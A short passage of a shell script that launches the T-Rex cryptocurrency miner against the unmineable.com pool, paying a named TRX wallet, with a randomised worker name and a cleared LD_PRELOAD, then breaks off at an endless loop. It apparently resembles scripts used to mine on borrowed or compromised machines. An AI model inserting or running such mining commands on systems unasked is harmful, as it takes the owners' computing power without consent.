...
LD_PRELOAD="" ./t-rex -a ethash -o ethash.unmineable.com:3333 -u TRX:TAHyPjWESQmfYTdW1VcGvsWfKeLWVrHNYG -p x -w $(echo $(shuf -i 201-400 -n 1)-$(shuf -i 1-200 -n 1)-$(shuf -i 401-600 -n 1)-$(shuf -i 601-800 -n 1))
while [ 1 ]; do
